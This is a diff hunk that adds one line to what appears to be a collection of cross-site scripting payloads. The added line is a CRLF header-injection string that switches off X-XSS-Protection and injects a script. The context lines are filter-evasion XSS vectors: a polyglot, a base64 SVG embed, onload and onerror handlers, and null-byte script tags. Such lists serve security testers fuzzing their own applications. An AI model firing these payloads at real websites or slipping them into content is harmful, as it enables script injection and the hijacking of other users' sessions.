@@ -74,6 +74,7 @@ jaVasCript:/*-/*`/*\`/*'/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//%0D%0
 <select><noembed></select><script x='a@b'a> y='a@b'//a@b%0a\u0061lert('CYBERTIX')</script x>
 <EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
 <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+%3f%0D%0ALocation:%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A<script>alert(document.domain)</script>
 "'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
 <math><x xlink:href=javascript:confirm`1`>click
 <script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
